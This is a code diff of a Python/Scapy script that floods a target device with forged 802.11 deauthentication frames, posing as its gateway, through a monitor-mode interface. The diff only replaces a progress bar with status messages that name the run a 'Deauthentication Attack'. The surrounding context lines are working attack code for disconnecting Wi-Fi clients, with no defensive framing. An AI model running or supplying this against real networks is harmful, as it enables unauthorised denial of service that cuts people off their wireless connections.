@@ -11,11 +11,12 @@ parser.add_argument("-n", "--num-packets", help="Number of packets to send", typ
 parser.add_argument("-i", "--interface", help="Interface to use (e.g., wlan1mon)", required=True)
 args = parser.parse_args()
 
-# Function to display a progress bar
-def display_progress(current, total, length=50):
-    progress = int((current / total) * length)
-    bar = "#" * progress + "-" * (length - progress)
-    print(f"\rSending packets: [{bar}] {current}/{total}", end="")
+# Print header
+print("Starting Deauthentication Attack")
+print(f"Target: {args.target}")
+print(f"Gateway: {args.gateway}")
+print(f"Interface: {args.interface}")
+print("-" * 40)
 
 # Loop to send the specified number of deauth packets
 for i in range(args.num_packets):
@@ -23,7 +24,8 @@ for i in range(args.num_packets):
     dot11 = Dot11(addr1=args.target, addr2=args.gateway, addr3=args.gateway)
     packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
     sendp(packet, inter=0.1, count=1, iface=args.interface, verbose=0)
-    display_progress(i + 1, args.num_packets)
+    print(f"Packet {i + 1}/{args.num_packets} sent.")
 
-# Print a newline at the end to ensure the progress bar doesn't interfere with the command prompt
-print()
+# Indicate completion
+print("-" * 40)
+print("Deauthentication attack complete.")
